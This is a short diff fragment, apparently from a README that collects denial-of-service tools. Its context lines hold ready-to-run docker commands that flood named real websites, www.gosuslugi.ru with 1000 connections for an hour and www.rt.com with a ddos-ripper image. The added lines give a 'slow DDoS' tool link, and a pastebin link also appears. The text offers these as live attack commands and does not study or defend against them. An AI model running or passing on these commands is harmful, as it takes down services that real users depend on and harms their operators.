@@ -21,3 +21,7 @@ https://pastebin.com/JEuV9ftT
 docker run -ti --rm alpine/bombardier -c 1000 -d 3600s -l https://www.gosuslugi.ru
 docker run -it --rm nitupkcuf/ddos-ripper:latest www.rt.com
 ```
+
+# Awesome Slow DDoS tool
+
+https://github.com/gkbrk/slowloris
